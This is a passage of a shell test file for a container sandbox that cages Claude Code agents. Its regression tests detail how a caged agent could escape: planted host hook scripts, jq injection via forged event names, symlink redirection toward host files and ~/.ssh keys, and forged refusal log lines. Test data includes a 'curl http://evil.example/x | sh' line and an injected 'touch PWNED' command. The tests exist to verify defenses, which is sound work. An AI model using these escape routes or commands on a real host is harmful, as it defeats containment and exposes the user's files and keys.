  # ~/.claude/skills. That is worse than a planted slash command: a skill is an
  # auto-load plugin source, discovered and model-invoked with no user action.
  # The fix masks skills (and plugins) :ro over the base mount, seeded with a
  # pass-through copy so the box still READS the user's own skills.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project" "$HOME/.claude/skills/my-tool"
  echo "the skill" > "$HOME/.claude/skills/my-tool/SKILL.md"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success
  # the mask is mounted, and it is read-only
  run assert_docker_run_has "$cname" "/kit/skills:/home/coder/.claude/skills:ro"
  assert_success
  # ...and the box still reads the user's real skill through the seed copy
  run cat "$CLEAT_RUN_DIR/$cname/kit/skills/my-tool/SKILL.md"
  assert_output "the skill"
}

@test "regression: a caged agent cannot read another project's Claude transcripts" {
  # Measured on the maintainer's machine 2026-07-25: ~/.claude/projects held
  # 976 MB across 24 directories, one per project ever run under Claude Code,
  # all readable and writable from inside any box, plus 185 MB of versioned
  # file snapshots in file-history/ carrying content from unrelated projects.
  # A :ro self-mask does NOT fix this: measured, it blocks writes while leaving
  # a sibling transcript fully readable. The fix mounts a GENERATED parent
  # holding only this project's keys, so the host content is never mounted.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project"
  mkdir -p "$HOME/.claude/projects/-Users-someone-other-secret-project"
  echo "OTHER PROJECT SECRET" > "$HOME/.claude/projects/-Users-someone-other-secret-project/t.jsonl"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # the host projects dir is never mounted onto the container path
  run assert_docker_run_lacks "$cname" "$HOME/.claude/projects:/home/coder/.claude/projects"
  assert_success
  # a generated parent is mounted there instead, read-only
  run assert_docker_run_has "$cname" "$cname/home/projects:/home/coder/.claude/projects:ro"
  assert_success
  # and it contains only this project's keys, so the sibling is not present
  run bash -c "ls -A \"$CLEAT_RUN_DIR/$cname/home/projects\""
  refute_output --partial "other-secret-project"
}

@test "regression: a caged agent cannot plant a host hook script" {
  # ~/.claude/hooks was the last instruction-shaped surface riding the
  # read-write ~/.claude mount unmasked, and it is the one with the worst
  # consequence. The hooks capability executes the user's hook commands ON THE
  # HOST (_execute_host_hooks), and the documented way to write one names a
  # script under ~/.claude/hooks/. So a caged agent could overwrite that script,
  # trigger any tool event, and have the bridge run its content outside the box
  # as the user. Masking it :ro would stop the write but still hand the cage the
  # user's hook scripts to read; the box provably never needs them, because with
  # the cap ON every in-box hook command is rewritten to the forwarder and with
  # it OFF hooks are deleted, so the dir becomes a per-box empty instead.
  mock_docker_images "cleat"
  mkdir -p "$TEST_TEMP/project" "$HOME/.claude/hooks"
  echo "echo HOST HOOK CONTENT" > "$HOME/.claude/hooks/notify.sh"
  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"

  run cmd_run "$TEST_TEMP/project"
  assert_success

  # the host hooks dir is never mounted onto the container path
  run assert_docker_run_lacks "$cname" "$HOME/.claude/hooks:/home/coder/.claude/hooks"
  assert_success
  # this box's own generated dir is mounted there instead
  run assert_docker_run_has "$cname" "$cname/home/hooks:/home/coder/.claude/hooks"
  assert_success
  # and the user's real hook script is not inside it
  run bash -c "ls -A \"$CLEAT_RUN_DIR/$cname/home/hooks\""
  refute_output --partial "notify.sh"
}

@test "regression: a forwarded event cannot inject a jq program into the host bridge" {
  # The host bridge selected hook entries with the event name pasted into the
  # jq PROGRAM: jq -c ".hooks.\"$event_name\" // [] | .[]". event_name comes
  # from a line the container appended to the forwarding spool, which the hooks
  # capability bind-mounts read-write into the box. An event name carrying a
  # double quote therefore rewrote the program and returned an attacker-authored
  # hook entry regardless of the user's settings, and _execute_host_hooks then
  # ran that command on the HOST. Enabling the cap is consent to run YOUR hooks
  # on your machine, not consent to let the box choose the command.
  local settings="$TEST_TEMP/settings.json"
  jq -n --arg c "touch $TEST_TEMP/USER_HOOK_RAN" \
    '{hooks:{PreToolUse:[{hooks:[{type:"command",command:$c}]}]}}' > "$settings"
  local evil='X" // [{"hooks":[{"type":"command","command":"touch '"$TEST_TEMP"'/PWNED"}]}] // "'

  # the selection must treat the name as DATA and match nothing
  run jq -c --arg ev "$evil" '.hooks[$ev] // [] | .[]' "$settings"
  assert_success
  assert_output ""

  # end to end: a forged event naming the injected program runs no host command
  _RESOLVED_PROJECT="$TEST_TEMP/project"
  mkdir -p "$TEST_TEMP/project"
  local event
  event="$(jq -cn --arg ev "$evil" '{hook_event_name:$ev}')"
  run _execute_host_hooks "$event" "$settings"
  assert_success
  [ ! -e "$TEST_TEMP/PWNED" ] || { echo "host command executed from a forged event"; return 1; }

  # ...while a legitimate event still reaches the user's own hook. This half is
  # the positive control: without it, deleting the selection entirely would
  # pass the assertion above.
  event="$(jq -cn '{hook_event_name:"PreToolUse"}')"
  run _execute_host_hooks "$event" "$settings"
  assert_success
  [ -e "$TEST_TEMP/USER_HOOK_RAN" ] || { echo "the user's own hook did not run"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: the clip dir is bind-mounted read-write into the box, and the browser
# watcher appended the claimed URL to .proxy-log with a plain `>>`, which
# FOLLOWS a symlink. A caged process could therefore point that path at any
# file the host user can write and, because a URL carrying a newline still
# passed the http(s) prefix test, write whole lines of its choosing into it.
# A shell rc file made that host code execution.
# ─────────────────────────────────────────────────────────────────────────────
@test "regression v1.5.0: browser bridge cannot append to a host file through a planted proxy log symlink" {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  printf 'echo original\n' > "$TEST_TEMP/fake-rc"

  _browser_watcher "$dir" "true" "" "always" "0" >/dev/null 2>&1 &
  local wpid=$!
  sleep 0.7
  # Planted AFTER the watcher is up, which is the real attack: a startup-only
  # guard never sees this one.
  rm -f "$dir/.proxy-log"
  ln -s "$TEST_TEMP/fake-rc" "$dir/.proxy-log"
  printf 'https://x.example/a\ncurl http://evil.example/x | sh' > "$dir/.browser-open"
  sleep 2
  kill "$wpid" 2>/dev/null || true; wait "$wpid" 2>/dev/null || true

  run cat "$TEST_TEMP/fake-rc"
  assert_output "echo original"
  # Since v1.5.4 the log is not in the clip dir at all: the line lands in the
  # host-only bridge dir, where no link the box plants can redirect it.
  run grep -c 'opening URL' "$TEST_TEMP/bridge/proxy-log"
  assert_output "1"
}

@test "regression v1.5.0: cap watcher log does not truncate a host file through a symlink" {
  local target="$TEST_TEMP/precious-log"
  head -c 1200000 /dev/zero | tr '\0' 'q' > "$target"
  ln -s "$target" "$TEST_TEMP/.watcher-log"
  # Every caller passes a claim dir since v1.5.4, so the oversized arm is live.
  run _cap_watcher_log "$TEST_TEMP/.watcher-log" "$TEST_TEMP/claim"
  assert_success
  local sz; sz="$(wc -c < "$target" | tr -d '[:space:]')"
  [ "$sz" -gt 1000000 ] || {
    echo "REGRESSION: the link target was truncated to $sz bytes"; return 1; }
}

@test "regression v1.5.0: a symlink at the host-ready sentinel is replaced, never touched through" {
  local clip_dir="$TEST_TEMP/clip-hr"; mkdir -p "$clip_dir"
  local target="$TEST_TEMP/hr-target-must-not-exist"
  ln -s "$target" "$clip_dir/.host-ready"
  # Since v1.5.4 the sentinel is written inside the box (a docker exec, stubbed
  # here), so the watcher's readiness step is over once that call is recorded.
  _clipboard_watcher "$clip_dir" "cat > /dev/null" test-hr150 >/dev/null 2>&1 &
  local pid=$!
  local i
  for i in 1 2 3 4 5 6 7 8 9 10; do
    [ -e "$target" ] && break
    grep -q '/tmp/cleat-clip/.host-ready$' "$DOCKER_CALLS" 2>/dev/null && break
    sleep 0.3
  done
  stop_watcher "$pid" "$clip_dir"
  [ ! -e "$target" ] || {
    echo "REGRESSION: touch followed the planted link and created the target"; return 1; }
}

@test "regression v1.5.0: the python callback proxy does not co-bind an occupied loopback port" {
  # SO_REUSEPORT let a box-named port co-bind a live host service that also set
  # it, taking a share of that service's connections. The backend must fail its
  # bind and retry instead.
  command -v python3 >/dev/null 2>&1 || skip "python3 not available"
  mkdir -p "$TEST_TEMP/nosocat2"
  local b
  for b in bash date cat sleep python3; do ln -sf "$(command -v $b)" "$TEST_TEMP/nosocat2/$b"; done
  python3 - <<'PYSRV' > "$TEST_TEMP/holder.pid" 2>/dev/null &
import socket, sys, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
if hasattr(socket, 'SO_REUSEPORT'):
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
s.bind(('127.0.0.1', 45777)); s.listen(1)
time.sleep(20)
PYSRV
  local holder=$!
  sleep 1
  PATH="$TEST_TEMP/nosocat2" _auth_callback_proxy 45777 mybox "$TEST_TEMP/plog-rp" &
  local ppid=$!
  sleep 2.5
  kill "$ppid" 2>/dev/null || true; wait "$ppid" 2>/dev/null || true
  kill "$holder" 2>/dev/null || true; wait "$holder" 2>/dev/null || true
  run cat "$TEST_TEMP/plog-rp"
  assert_output --partial "bind attempt 1 failed"
}

@test "regression v1.5.0: a busy package manager is named instead of a bare Install failed" {
  # A fresh cloud image runs its own updater on first boot, holding the dpkg
  # lock, so get.docker.com dies with "Could not get lock
  # /var/lib/dpkg/lock-frontend". cleat printed a bare "Install failed" and the
  # reader concluded cleat was broken when the fix was to wait a minute.
  # Observed on a stock Ubuntu 24.04 droplet, 2026-09-08.
  local stub="$TEST_TEMP/pkgbusy"
  mkdir -p "$stub"
  # apt-get is "running", every other name is not.
  cat > "$stub/pgrep" <<'PG'
#!/usr/bin/env bash
[ "$2" = "apt-get" ] && exit 0
exit 1
PG
  # The download succeeds and writes a script, the script fails the way apt does.
  cat > "$stub/curl" <<'CURL'
#!/usr/bin/env bash
out=""
while [ $# -gt 0 ]; do [ "$1" = "-o" ] && out="$2"; shift; done
[ -n "$out" ] && printf '#!/bin/sh\nexit 1\n' > "$out"
exit 0
CURL
  cat > "$stub/sudo" <<'SUDO'
#!/usr/bin/env bash
exit 1
SUDO
  chmod +x "$stub/pgrep" "$stub/curl" "$stub/sudo"

  _is_macos() { return 1; }
  _is_wsl() { return 1; }
  PATH="$stub:$PATH"

  run _offer_docker_install <<< "y"
  assert_failure
  assert_output --partial "the package manager is busy"
  assert_output --partial "apt-get is already running"
}

@test "regression v1.5.0: a docker install failure with no busy manager still hands over the manual command" {
  # The plain failure path called error() and exited without ever printing
  # _docker_install_hint, so a reader whose install failed for any other reason
  # was left with no next step at all.
  local stub="$TEST_TEMP/pkgfree"
  mkdir -p "$stub"
  cat > "$stub/pgrep" <<'PG'
#!/usr/bin/env bash
exit 1
PG
  cat > "$stub/curl" <<'CURL'
#!/usr/bin/env bash
out=""
while [ $# -gt 0 ]; do [ "$1" = "-o" ] && out="$2"; shift; done
[ -n "$out" ] && printf '#!/bin/sh\nexit 1\n' > "$out"
exit 0
CURL
  cat > "$stub/sudo" <<'SUDO'
#!/usr/bin/env bash
exit 1
SUDO
  chmod +x "$stub/pgrep" "$stub/curl" "$stub/sudo"

  _is_macos() { return 1; }
  _is_wsl() { return 1; }
  PATH="$stub:$PATH"

  run _offer_docker_install <<< "y"
  assert_failure
  assert_output --partial "Install failed."
  assert_output --partial "Install Docker yourself with"
  refute_output --partial "the package manager is busy"
}

@test "regression v1.5.0: the package-manager probe matches a command name, never a path or argument" {
  # Matching the full command line would fire on anything mentioning apt, which
  # on the failure path means blaming a lock that was never held. The ps
  # fallback (a minimal image with no procps pgrep) must compare basenames only.
  local stub="$TEST_TEMP/pkgname"
  mkdir -p "$stub"
  local b
  for b in bash cat printf; do
    [ -n "$(command -v $b 2>/dev/null)" ] && ln -sf "$(command -v $b)" "$stub/$b"
  done
  # Deliberately NO pgrep here, so _pkg_manager_busy takes the ps branch.
  # Decoys: a path whose BASENAME is not a manager, and a local wrapper whose
  # name merely contains one. Neither may match.
  cat > "$stub/ps" <<'PS'
#!/usr/bin/env bash
printf '%s\n' /usr/lib/apt/apt.systemd.daily-helper
printf '%s\n' my-apt-wrapper
printf '%s\n' sshd
PS
  chmod +x "$stub/ps"
  local out=""
  out="$(PATH="$stub" _pkg_manager_busy)" || out=""
  [ -z "$out" ] || {
    echo "REGRESSION: false positive, matched '$out' on a decoy"; return 1; }

  # A real manager reported with a leading path MUST still be detected. This is
  # what the basename strip is for: ps on some systems prints an absolute path,
  # and comparing the raw line there silently misses a genuinely held lock.
  cat > "$stub/ps" <<'PS2'
#!/usr/bin/env bash
printf '%s\n' sshd
printf '%s\n' /usr/bin/apt-get
PS2
  chmod +x "$stub/ps"
  out="$(PATH="$stub" _pkg_manager_busy)" || out=""
  [ "$out" = "apt-get" ] || {
    echo "REGRESSION: a path-qualified apt-get was missed (got '$out')"; return 1; }

  # And a truncated comm with no path still works.
  cat > "$stub/ps" <<'PS3'
#!/usr/bin/env bash
printf '%s\n' unattended-upgr
PS3
  chmod +x "$stub/ps"
  out="$(PATH="$stub" _pkg_manager_busy)" || out=""
  [ "$out" = "unattended-upgr" ] || {
    echo "REGRESSION: ps fallback missed a bare comm (got '$out')"; return 1; }
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0: docs/cli.md promises "Without jq on the host the box falls back to
# empty settings". Both arms of the create-time project overlay fell through to
# a verbatim `cp` instead, mounting the user's real host hook commands into the
# box, where Claude Code ran them in the container and osascript and every other
# host-only command is not there. The host bridge never started either, because
# _has_host_hooks needs jq to answer and its "no" is indistinguishable from a
# real "no hooks configured", so the hooks ran nowhere at all with no message.
# jq ships in the image but is NOT a documented host requirement.
# ─────────────────────────────────────────────────────────────────────────────

# _hide_jq (a host with no jq) lives in test/setup.bash, shared with the
# credential tests.

@test "regression v1.5.0: a jq-less host gets empty project settings, not the real hook commands" {
  mock_docker_images "cleat"
  cat > "$CLEAT_GLOBAL_CONFIG" << 'EOF'
[caps]
hooks
EOF
  mkdir -p "$TEST_TEMP/project/.claude"
  cat > "$TEST_TEMP/project/.claude/settings.json" << 'EOF'
{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"osascript -e beep"}]}]}}
EOF
  _hide_jq

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  local overlay="$CLEAT_RUN_DIR/${cname}/settings/project-settings.json"
  [ -f "$overlay" ] || { echo "REGRESSION: no overlay written at all"; return 1; }
  run cat "$overlay"
  refute_output --partial "osascript"
  assert_output --partial "{}"
}

@test "regression v1.5.0: a jq-less host gets empty project settings with the hooks cap off too" {
  mock_docker_images "cleat"
  : > "$CLEAT_GLOBAL_CONFIG"
  mkdir -p "$TEST_TEMP/project/.claude"
  cat > "$TEST_TEMP/project/.claude/settings.json" << 'EOF'
{"hooks":{"PreToolUse":[{"hooks":[{"type":"command","command":"osascript -e beep"}]}]}}
EOF
  _hide_jq

  local cname
  cname="$(container_name_for "$TEST_TEMP/project")"
  run cmd_run "$TEST_TEMP/project"
  assert_success

  local overlay="$CLEAT_RUN_DIR/${cname}/settings/project-settings.json"
  [ -f "$overlay" ] || { echo "REGRESSION: no overlay written at all"; return 1; }
  run cat "$overlay"
  refute_output --partial "osascript"
  assert_output --partial "{}"
}

@test "regression v1.5.0: the hooks cap says so on a host with no jq instead of forwarding nothing in silence" {
  ACTIVE_CAPS=(hooks)
  _hide_jq
  run exec_claude "test-ctr" --dangerously-skip-permissions
  assert_output --partial "jq is not installed on the host"
}

@test "regression v1.5.0: exec_claude hands a fork box's hook bridge the COPY, not the origin tree" {
  # exec_claude used to pass cmd_run's `local _workspace`, which is gone by the
  # time any caller reaches exec_claude. The real binary died on set -u (see the
  # smoke test). With strict mode stripped the name expands empty and the
  # watcher's default falls back to the project, so a fork box's host hooks
  # were pointed at the ORIGIN working tree.
  command -v jq >/dev/null 2>&1 || skip "the bridge branch needs jq on the host"
  echo '{"hooks":{"Stop":[{"hooks":[{"type":"command","command":"true"}]}]}}' > "$HOME/.claude/settings.json"
  mkdir -p "$TEST_TEMP/project"
  ACTIVE_CAPS=(hooks)
  _RESOLVED_PROJECT="$TEST_TEMP/project"
  local cname="test-fork-bridge"
  _fork_mark "$cname"
  mkdir -p "$(_fork_dir "$cname")"
  _host_open_cmd() { echo ""; }
  local rec="$TEST_TEMP/bridge_ws"
  # The bridge is spawned in the background and killed by the session cleanup,
  # so record its workspace argument and hold exec_claude at the next step
  # until the record exists. Bounded, so a bridge that never spawns fails
  # rather than hangs.
  _hook_bridge_watcher() { printf '%s\n' "$2" > "$rec.part" && mv "$rec.part" "$rec"; }
  _wait_for_coder_remap() {
    local i=0
    while [ ! -f "$rec" ] && [ "$i" -lt 50 ]; do sleep 0.1; i=$((i + 1)); done
  }
  run exec_claude "$cname" --dangerously-skip-permissions
  [ -f "$rec" ] || { echo "the hook bridge was never spawned"; return 1; }
  run cat "$rec"
  assert_output "$(_fork_dir "$cname")"
}

# Start the real hook bridge from launch directory $1 for workspace $2, the way
# exec_claude starts it from wherever cleat was run, append spool line $3, and
# wait (bounded) for the host hook to write $TEST_TEMP/hook_out. The host hook
# prints the file its event's tool_input.file_path names, as a Read or a
# formatter hook would open it.
_bridge_opens_from() {
  local launch="$1" ws="$2" ev="$3" spool="$TEST_TEMP/events.jsonl" bpid i
  mkdir -p "$HOME/.claude"
  printf '{"hooks":{"PostToolUse":[{"hooks":[{"type":"command","command":"f=$(jq -r .tool_input.file_path); cat \\"$f\\" > %s/hook_out.part 2>/dev/null; mv %s/hook_out.part %s/hook_out"}]}]}}\n' \
    "$TEST_TEMP" "$TEST_TEMP" "$TEST_TEMP" > "$HOME/.claude/settings.json"
  : > "$spool"
  ( cd "$launch" && _hook_bridge_watcher "$spool" "$ws" "box-a" ) >/dev/null 2>&1 &
  bpid=$!
  sleep 0.7
  printf '%s\n' "$ev" >> "$spool"
  for i in $(seq 1 12); do
    [ -f "$TEST_TEMP/hook_out" ] && break
    sleep 0.5
  done
  kill "$bpid" 2>/dev/null || true
  wait "$bpid" 2>/dev/null || true
}

@test "regression v1.5.0: a relative hook path is opened from the directory it was judged in" {
  # The bridge judged a relative path field from the event's translated cwd but
  # started the hook in its own working directory, the project root. With a
  # real sub/evil/ and a planted evil -> ~/.ssh at the root, a Write event from
  # cwd /workspace/sub naming evil/id_rsa passed the check and a PostToolUse
  # hook copied the private key out.
  command -v jq >/dev/null 2>&1 || skip "the bridge needs jq on the host"
  local ws="$TEST_TEMP/proj"
  mkdir -p "$ws/sub/evil" "$TEST_TEMP/dot-ssh"
  printf 'PRIVATE-KEY\n' > "$TEST_TEMP/dot-ssh/id_rsa"
  printf 'IN-SUB\n' > "$ws/sub/evil/id_rsa"
  ln -s "$TEST_TEMP/dot-ssh" "$ws/evil"
  _bridge_opens_from "$ws" "$ws" '{"hook_event_name":"PostToolUse","transcript_path":"/t","cwd":"/workspace/sub","tool_name":"Write","tool_input":{"file_path":"evil/id_rsa","content":"x"}}'
  [ -f "$TEST_TEMP/hook_out" ] || { echo "the hook never ran"; return 1; }
  run cat "$TEST_TEMP/hook_out"
  refute_output --partial "PRIVATE-KEY"
  assert_output "IN-SUB"
}

@test "regression v1.5.0: a fork box's hook runs in the copy, so a relative path opens the copy's file" {
  # The same mismatch in a fork box: the relative value was judged inside the
  # fork copy and opened from the ORIGIN tree, where cleat was launched.
  command -v jq >/dev/null 2>&1 || skip "the bridge needs jq on the host"
  local origin="$TEST_TEMP/origin" fork="$TEST_TEMP/fork"
  mkdir -p "$origin" "$fork/evil" "$TEST_TEMP/outside"
  printf 'TOP-SECRET\n' > "$TEST_TEMP/outside/secret"
  printf 'FORK-COPY\n' > "$fork/evil/secret"
  ln -s "$TEST_TEMP/outside" "$origin/evil"
  _RESOLVED_PROJECT="$origin"
  _bridge_opens_from "$origin" "$fork" '{"hook_event_name":"PostToolUse","transcript_path":"/t","cwd":"/workspace","tool_name":"Read","tool_input":{"file_path":"evil/secret"}}'
  [ -f "$TEST_TEMP/hook_out" ] || { echo "the hook never ran"; return 1; }
  run cat "$TEST_TEMP/hook_out"
  refute_output --partial "TOP-SECRET"
  assert_output "FORK-COPY"
}

@test "regression v1.5.0: a Grep over more files than the path-field ceiling keeps its event" {
  # tool_response.filenames entries counted toward the 256 path fields, so a
  # Grep with head_limit 0 or more than about 253 matches dropped the whole
  # PostToolUse event, though a filenames entry is only ever nulled.
  command -v jq >/dev/null 2>&1 || skip "needs jq"
  local names
  names="$(jq -cn '[range(0; 300) | "/workspace/f\(.)"]')"
  run _hook_translate_event "{\"hook_event_name\":\"PostToolUse\",\"cwd\":\"/workspace\",\"tool_name\":\"Grep\",\"tool_input\":{\"pattern\":\"k\",\"output_mode\":\"files_with_matches\"},\"tool_response\":{\"filenames\":$names}}" "/Users/you/proj"
  assert_success
  assert_output --partial '"/Users/you/proj/f299"'
}

@test "regression v1.5.0: the session key is derived under a pinned C locale" {
  # _claude_session_key pins LC_ALL=C and explains why; _derive_project_session_key
  # did not, though it feeds the same class of path. Under a UTF-8 collation the
  # A-Z range in its sed can match outside the letters it means, so the same
  # project could key differently on two runs that differ only in locale. A key
  # that moves orphans the project's entire session history and its .claude.json
  # store, which is exactly the silent loss the dot and underscore bugs caused.
  #
  # The UTF-8 locale is DISCOVERED, never hardcoded: Linux images ship C.utf8
  # and macOS ships en_US.UTF-8, and naming the wrong one makes setlocale fail
  # silently, fall back to C, and compare C against C, which passes no matter
  # what the code does.
  local utf8_locale ascii utf8
  utf8_locale="$(locale -a 2>/dev/null | grep -iE '\.(utf-?8)$' | head -1 || true)"
  [ -n "$utf8_locale" ] || skip "no UTF-8 locale available on this host"
  ascii="$(LC_ALL=C _derive_project_session_key "/tmp/Ärger_Project")"
  utf8="$(LC_ALL="$utf8_locale" _derive_project_session_key "/tmp/Ärger_Project")"
  [ "$ascii" = "$utf8" ]
}

@test "regression v1.5.0: an ASCII project keys byte-identically to the pre-pin form" {
  # The pin must not re-key anybody. This is the exact string the old code
  # produced for this path.
  run _derive_project_session_key "/Users/marcin/Workspaces/cleat"
  assert_output "cleat-0f459ff8"
}

# ── browser refusal reporting, 2026-09-13 ───────────────────────────────────
# The destination gate's refusal notice had four defects. cleat shell and
# cleat login ran the watcher and never reported. The parse took the LAST
# url= and origin= on the line. Plain links and loopback URLs were reported
# with an allow line that could never make them open. And a URL carrying the
# marker text forged a refusal naming any host the box liked.

# Run the real watcher against one URL until it logs a decision. $1 = the URL,
# $2 = host_opens_clicks. No container name, so no callback proxy.
_vnext_watch_once() {
  local dir="$TEST_TEMP/clip"; mkdir -p "$dir"
  _browser_watcher "$dir" "true" "" "auto" "${2:-1}" >/dev/null 2>&1 &
  local wpid=$! i=0
  printf '%s' "$1" > "$dir/.browser-open"
  while [ "$i" -lt 100 ]; do
    grep -q "opening URL\|deferring URL\|$_BROWSER_BLOCKED_MARK" "$TEST_TEMP/bridge/proxy-log" 2>/dev/null && break
    sleep 0.1
    i=$((i + 1))
  done
  kill "$wpid" 2>/dev/null || true
  wait "$wpid" 2>/dev/null || true
}

# The interactive exec writes an authorize URL at an unlisted origin into the
# bridge file, as a login inside the box does, and returns once the watcher
# has refused it. A refusal from an earlier session is already in the log, so
# the offset guard is under test too.
_vnext_refuse_during_exec() {
  _T_BW_CLIP="$1"
  # The watcher's log is the host-only bridge dir beside the clip dir.
  _T_BW_LOG="$(dirname "$_T_BW_CLIP")/bridge/proxy-log"
  mkdir -p "$(dirname "$_T_BW_LOG")"
  printf '[browser-watcher 09:00:00] %s origin=old.example.com url=https://old.example.com/oauth/authorize?redirect_uri=http%%3A%%2F%%2Flocalhost%%3A45454%%2Fcb\n' \
    "$_BROWSER_BLOCKED_MARK" > "$_T_BW_LOG"
  docker() {
    case "$*" in
      "exec -it "*)
        printf '%s' "https://auth.example.com/oauth/authorize?client_id=x&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback" > "$_T_BW_CLIP/.browser-open"
        local i=0
        while [ "$i" -lt 100 ]; do
          grep -q "$_BROWSER_BLOCKED_MARK origin=auth.example.com" "$_T_BW_LOG" 2>/dev/null && break
          sleep 0.1
          i=$((i + 1))
        done ;;
    esac
    command docker "$@"
  }
}

@test "regression v1.5.0: cleat shell reports a browser open the gate refused" {
  # docs/cli.md promised the refusal is surfaced on the terminal when the
  # session ends. Only exec_claude read the log, so a login run from a shell
  # was refused with nothing on screen.
  mkdir -p "$TEST_TEMP/project"
  local cname; cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo "true"; }
  local clip="$CLEAT_RUN_DIR/$cname/clip"; mkdir -p "$clip"
  _vnext_refuse_during_exec "$clip"
  run cmd_shell "$TEST_TEMP/project"
  assert_success
  assert_output --partial "https://auth.example.com/oauth/authorize"
  assert_output --partial "cleat browser allow auth.example.com"
  refute_output --partial "old.example.com"
}

@test "regression v1.5.0: cleat login reports a browser open the gate refused" {
  # cleat login promises the browser will open. When the gate refused the
  # origin, nothing said why it did not.
  mkdir -p "$TEST_TEMP/project"
  local cname; cname="$(container_name_for "$TEST_TEMP/project")"
  mock_docker_ps "$cname"
  _host_open_cmd() { echo "true"; }
  local clip="$CLEAT_RUN_DIR/$cname/clip"; mkdir -p "$clip"
  _vnext_refuse_during_exec "$clip"
  run cmd_login "$TEST_TEMP/project"
  assert_success
  assert_output --partial "https://auth.example.com/oauth/authorize"
  assert_output --partial "cleat browser allow auth.example.com"
  refute_output --partial "old.example.com"
}

@test "regression v1.5.0: a refused login URL carrying return_url= and origin= is reported whole" {
  # Driven through the real watcher, so the line parsed is the line written.
  # `${l##*url=}` took the last url=, which was inside return_url=, and
  # `${l##*origin=}` took a trailing origin= the query chose.
  local u="https://auth.example.com/oauth/authorize?client_id=x&return_url=https://app.example.org/done&redirect_uri=http%3A%2F%2Flocalhost%3A45454%2Fcallback&origin=evil.example"
  _vnext_watch_once "$u" 1
  run _maybe_report_blocked_opens "$TEST_TEMP/bridge/proxy-log" 0
  assert_output --partial "$u"
  assert_output --partial "cleat browser allow auth.example.com"
  refute_output --partial "allow evil.example"
  refute_output --partial "allow app.example.org"
}

@test "regression v1.5.0: a plain link or a loopback URL is never reported as blocked" {
  # Neither opens with its origin listed: a plain link defers even at a listed
  # origin, and cleat browser allow refuses localhost. Both used to print an
  # allow line, the second one a command the verb rejects.
  local u
  for u in "https://docs.python.org/3/library/" "http://localhost:3000/"; do
    rm -rf "$TEST_TEMP/clip" "$TEST_TEMP/bridge"
    _vnext_watch_once "$u" 0
    run cat "$TEST_TEMP/bridge/proxy-log"
    assert_output --partial "deferring URL to terminal"
    run _maybe_report_blocked_opens "$TEST_TEMP/bridge/proxy-log" 0
    assert_output ""
  done
}

@test "regression v1.5.0: marker text inside a URL is never read as a refusal" {
  # The box writes the URL and the watcher logs it on every branch. Searching
  # the whole line for the marker let a deferred link at a listed origin forge
  # a refusal naming a host of the box's choosing.
  # The forged text is the whole shape the watcher writes, timestamp included,
  # so only an anchor on the line's first byte tells the two apart.
  _vnext_watch_once "https://github.com/x?a=[browser-watcher 00:00:00] ${_BROWSER_BLOCKED_MARK} origin=gh-login.evil.tld url=https://gh-login.evil.tld/" 1
  run cat "$TEST_TEMP/bridge/proxy-log"
  assert_output --partial "deferring URL to terminal"
  run _maybe_report_blocked_opens "$TEST_TEMP/bridge/proxy-log" 0
  assert_success
  assert_output ""
}

# ─────────────────────────────────────────────────────────────────────────────
# v1.5.0 and v1.4.3: _oauth_expires_at took the LAST "expiresAt" anywhere in a
# credential file. Claude Code 2.1.270 keeps MCP OAuth tokens in the same file
# under mcpOAuth, each with its own expiresAt. It writes that key after
# claudeAiOauth once an MCP login follows a Claude login. Every newest-wins
# decision then compared MCP token lifetimes. With the same 24 h MCP token in
# both copies a box's refreshed login never looked newer and was never
# harvested. Staging put an older store copy over a fresher box login whose MCP
# token happened to be older. On macOS the shared-login re-seed read an expired
# MCP token as an expired login and put the Keychain's older token over the
# box's newer one, taking the MCP logins with it.
#
# Fixtures follow the account fixture convention: the generation tag lives in
# accessToken and refreshToken names the grant, so it stays equal across
# generations. These pin the expiry decision and nothing about identity.
# ─────────────────────────────────────────────────────────────────────────────
_mcp_cred_blob() {   # $1 = access-token tag, $2 = claudeAiOauth.expiresAt, $3 = the MCP entry's expiresAt
  printf '{"claudeAiOauth":{"accessToken":"sk-ant-oat01-%s","refreshToken":"sk-ant-ort01-SAME","expiresAt":%s,"scopes":["user:inference","user:profile"],"subscriptionType":"max","rateLimitTier":"default_claude_max_20x"},"mcpOAuth":{"labmcp|cda6d80a97111f6e":{"serverName":"labmcp","serverUrl":"http://127.0.0.1:36963/mcp","accessToken":"FAKE-MCP-at","discoveryState":{"authorizationServerUrl":"http://127.0.0.1:36963","oauthMetadataFound":true},"clientId":"lab-mcp-client","refreshToken":"FAKE-MCP-rt","expiresAt":%s,"scope":"read"}}}' "$1" "$2" "$3"
}

@test "regression v1.5.0: account newest-wins reads the Claude login expiry, not an MCP entry written after it" {
  CLEAT_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/accounts"
  CLEAT_BOX_ACCOUNTS_DIR="$TEST_TEMP/home/.config/cleat/box-accounts"
  CLEAT_RUN_DIR="$TEST_TEMP/home/.config/cleat/run"
  mkdir -p "$CLEAT_ACCOUNTS_DIR" "$CLEAT_BOX_ACCOUNTS_DIR" "$CLEAT_RUN_DIR"
  _CLEAT_NOW_S=1789000000
  curl() { cat >/dev/null 2>&1; return 7; }
  local cn="cleat-proj-abcdef12" now_ms=1789000000000 h=3600000 store box mode
  _box_account_write "$cn" work
  _account_ensure_dir work
  store="$(_account_cred_path work)"
  box="$(_account_box_auth_dir "$cn")/.credentials.json"
  mkdir -p "${box%/*}"
  for mode in jq nojq; do
    [[ "$mode" == nojq ]] && _hide_jq
